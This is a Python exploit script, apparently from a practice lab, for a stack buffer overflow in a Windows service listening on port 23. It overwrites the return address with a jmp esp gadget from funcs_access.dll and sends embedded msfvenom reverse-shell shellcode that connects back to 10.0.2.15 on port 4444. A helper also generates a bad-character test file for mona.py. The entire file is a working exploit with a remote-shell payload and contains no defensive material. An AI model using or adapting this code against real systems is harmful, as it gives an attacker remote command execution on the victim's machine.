import socket
import struct 
import time

def brief_pause():
    time.sleep(1)

def conv(address):
    return struct.pack("<I", address)

def generate_badchar():
    badchar_str = b""

    # Badchars causing payload to fail.
    badchar_list = [0x00, 0x0A, 0x4D, 0x4F, 0x5F, 0x79, 0x7E, 0x7F]

    # Generate string to test for badchars.
    for i in range(0x00, 0xff + 1):
        if i not in badchar_list:
            badchar_str += struct.pack("B", i)

    # For comparison with mona.py , !mona compare -f "location_of_badchar_bin_file" -a "hex_address_where_payload_is_located"
    with open("badchar_file.bin", "wb+") as bf:
        bf.write(badchar_str)

    return badchar_str

def exploit():
    target_ip = "192.168.153.131"
    target_port = 23
    recv_buf = 4096
    
    junk = b"A" * 1902 

    # 0x625012d0 : jmp esp |  {PAGE_EXECUTE_READ} [funcs_access.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\adminuser\Desktop\funcs_access.dll)
    ret_addr = conv(0x625012D0) 

    # Padding between EIP to shellcode
    nop_sled = b'\x90' * 16

    # msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=4444 -b '\x00\x0a\x4d\x4f\x5f\x79\x7e\x7f' -f python
    shellcode =  b""
    shellcode += b"\x2b\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
    shellcode += b"\x76\x0e\xe7\xec\xa3\xb6\x83\xee\xfc\xe2\xf4\x1b\x04"
    shellcode += b"\x21\xb6\xe7\xec\xc3\x3f\x02\xdd\x63\xd2\x6c\xbc\x93"
    shellcode += b"\x3d\xb5\xe0\x28\xe4\xf3\x67\xd1\x9e\xe8\x5b\xe9\x90"
    shellcode += b"\xd6\x13\x0f\x8a\x86\x90\xa1\x9a\xc7\x2d\x6c\xbb\xe6"
    shellcode += b"\x2b\x41\x44\xb5\xbb\x28\xe4\xf7\x67\xe9\x8a\x6c\xa0"
    shellcode += b"\xb2\xce\x04\xa4\xa2\x67\xb6\x67\xfa\x96\xe6\x3f\x28"
    shellcode += b"\xff\xff\x0f\x99\xff\x6c\xd8\x28\xb7\x31\xdd\x5c\x1a"
    shellcode += b"\x26\x23\xae\xb7\x20\xd4\x43\xc3\x11\xef\xde\x4e\xdc"
    shellcode += b"\x91\x87\xc3\x03\xb4\x28\xee\xc3\xed\x70\xd0\x6c\xe0"
    shellcode += b"\xe8\x3d\xbf\xf0\xa2\x65\x6c\xe8\x28\xb7\x37\x65\xe7"
    shellcode += b"\x92\xc3\xb7\xf8\xd7\xbe\xb6\xf2\x49\x07\xb3\xfc\xec"
    shellcode += b"\x6c\xfe\x48\x3b\xba\x84\x90\x84\xe7\xec\xcb\xc1\x94"
    shellcode += b"\xde\xfc\xe2\x8f\xa0\xd4\x90\xe0\x13\x76\x0e\x77\xed"
    shellcode += b"\xa3\xb6\xce\x28\xf7\xe6\x8f\xc5\x23\xdd\xe7\x13\x76"
    shellcode += b"\xe6\xb7\xbc\xf3\xf6\xb7\xac\xf3\xde\x0d\xe3\x7c\x56"
    shellcode += b"\x18\x39\x34\xdc\xe2\x84\xa9\xb6\xe5\xe3\xcb\xb4\xe7"
    shellcode += b"\xfd\xff\x3f\x01\x86\xb3\xe0\xb0\x84\x3a\x13\x93\x8d"
    shellcode += b"\x5c\x63\x62\x2c\xd7\xba\x18\xa2\xab\xc3\x0b\x84\x53"
    shellcode += b"\x03\x45\xba\x5c\x63\x8f\x8f\xce\xd2\xe7\x65\x40\xe1"
    shellcode += b"\xb0\xbb\x92\x40\x8d\xfe\xfa\xe0\x05\x11\xc5\x71\xa3"
    shellcode += b"\xc8\x9f\xb7\xe6\x61\xe7\x92\xf7\x2a\xa3\xf2\xb3\xbc"
    shellcode += b"\xf5\xe0\xb1\xaa\xf5\xf8\xb1\xba\xf0\xe0\x8f\x95\x6f"
    shellcode += b"\x89\x61\x13\x76\x3f\x07\xa2\xf5\xf0\x18\xdc\xcb\xbe"
    shellcode += b"\x60\xf1\xc3\x49\x32\x57\x53\x03\x45\xba\xcb\x10\x72"
    shellcode += b"\x51\x3e\x49\x32\xd0\xa5\xca\xed\x6c\x58\x56\x92\xe9"
    shellcode += b"\x18\xf1\xf4\x9e\xcc\xdc\xe7\xbf\x5c\x63"

    bof  = b''
    bof += junk
    bof += ret_addr
    bof += nop_sled
    bof += shellcode

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mySock:
        mySock.connect((target_ip, target_port))

        try:
            data_from_srv = mySock.recv(recv_buf)
            print(f"[+] Initial reply -> {data_from_srv}")

            brief_pause()

            print(f"[+] Sending data -> {bof}")
            mySock.sendall(bof)

        except ConnectionResetError as err:
            print(f"Terminating due to:\n{err}")

if __name__ == "__main__":
    exploit()